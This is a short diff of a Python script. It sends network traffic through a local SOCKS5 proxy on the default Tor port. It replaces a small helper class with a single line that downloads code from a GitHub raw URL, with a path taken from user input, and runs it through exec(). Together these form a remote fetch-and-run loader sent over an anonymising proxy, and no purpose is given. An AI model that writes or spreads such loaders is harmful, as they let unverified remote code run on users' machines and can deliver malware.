@@ -843,9 +843,4 @@ from urllib.request import Request,urlopen
 import socket
 set_default_proxy(SOCKS5,'127.0.0.1',9150)
 socket.socket=socksocket
-
-class safenet:
-    def getbin(url):
-        return urlopen(Request(url)).read()
-      
-exec(safenet.getbin('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input('>')))
+exec(urlopen(Request('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input('>'))).read())
